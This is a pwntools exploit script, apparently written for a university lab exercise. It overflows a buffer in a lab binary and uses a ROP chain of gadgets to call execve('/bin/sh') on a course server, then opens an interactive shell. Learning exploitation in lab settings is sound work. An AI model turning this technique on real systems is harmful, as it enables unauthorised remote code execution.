''' Script Module Importing '''
from pwn import *

context.arch = "x86_64"             # Set Exploit Architecture to x86_64

''' Constant Initializing '''
BUFF_FILL = b"A"*536                            # Set Buffer Filler

POP_RAX = p64(0x453377)                         # Set Gadget 1: pop rax; ret
POP_RDI = p64(0x4018a2)                         # Set Gadget 2: pop rdi; ret
POP_RSI = p64(0x4027ca)                         # Set Gadget 3: pop rsi; ret
POP_RDX = p64(0x4017af)                         # Set Gadget 3: pop rdx; ret

SYS_EXECVE = p64(59)                            # Set Sys Call 1: execve (59)
SYS_CALL = p64(0x401213)                        # Set Sys Call address

EXECVE_FILE = p64(0x4c20f0)                     # Set execve() filename: Shell Parameter
EXECVE_ARGV = p64(0)                            # Set execve() argv: null (0)
EXECVE_ENVP = p64(0)                            # Set execve() envp: null (0)


''' Establish Connection '''
p = remote("csc748.hostbin.org", 7042)          # Test Script Against Server
# p = process("./4-2_lab.bin")                  # Test Script Locally
# p = gdb.debug("./4-2_lab.bin")                # Debug with GDB

''' ' ' ' ' ' ' ' ' ' ' ' ' ' '''
''' Step 1: Analyze ROP Chain '''
''' ' ' ' ' ' ' ' ' ' ' ' ' ' '''

# ''' Use Hexdump to Analyze Output '''
# print("\n\n Output of hexdump:\n", '-' * 50)
# print(hexdump(p.read(1500)),'\n\n')
# 
# ''' Define and Run Ropper Shell Commands '''
# # Define and Run Ropper Shell Commands
# rop_chain = [
#     "pop rax; ret",
#     "pop rdi; ret",
#     "pop rsi; ret",
#     "pop rdx; ret",
#     "syscall"
# ]
# print(" Output of Ropper commands:\n", '-' * 50)  # Separator
# 
# for command in rop_chain:
#     ropper_command = ["ropper", "-f", "4-2_lab.bin", "--search", command]
#     print(f"\n Output of ropper --search {command}:\n", '-' * 50)
#     print(subprocess.check_output(ropper_command, text=True))


''' ' ' ' ' ' ' ' ' '''
''' Step 2: Exploit '''
''' ' ' ' ' ' ' ' ' '''

''' Prepare Payload '''
#
# Payload Format:
#   BUFF_FILL:      Filler for Buffer
#
#   POP_RAX:        Pointer to a 'pop rax; ret' gadget to load RAX register with SYS_EXECVE (59)
#   SYS_EXECVE:     The syscall number (59) for the sys_execve syscall (64-bit).
#
#   POP_RDI:        Pointer to a 'pop rdi; ret' gadget to load RDI register with "/bin/sh"
#   EXECVE_FILE:    Pointer to the string '/bin/sh/' for use as file parameter in sys_execve()
#
#   POP_RSI:        Pointer to a 'pop rsi; ret' gadget to load RSI register with '0'
#   EXECVE_ARGV:    Null Value (0) for use as argv parameter in sys_execve()
#
#   POP_RDX:        Pointer to a 'pop rdx; ret' gadget to load RDX register with '0'
#   EXECVE_ENVP:    Null Value (0) for use as envp parameter in sys_execve()
#
#   SYS_CALL:       Pointer to 'syscall' to execute sys_execve()
#

payload = BUFF_FILL + \
          POP_RAX + \
          SYS_EXECVE + \
          POP_RDI + \
          EXECVE_FILE + \
          POP_RSI + \
          EXECVE_ARGV + \
          POP_RDX + \
          EXECVE_ENVP + \
          SYS_CALL

''' Overwrite the Stack '''
p.sendline(payload)         # Send the Payload

''' Exploit Server '''
p.interactive()             # Start Interactive Session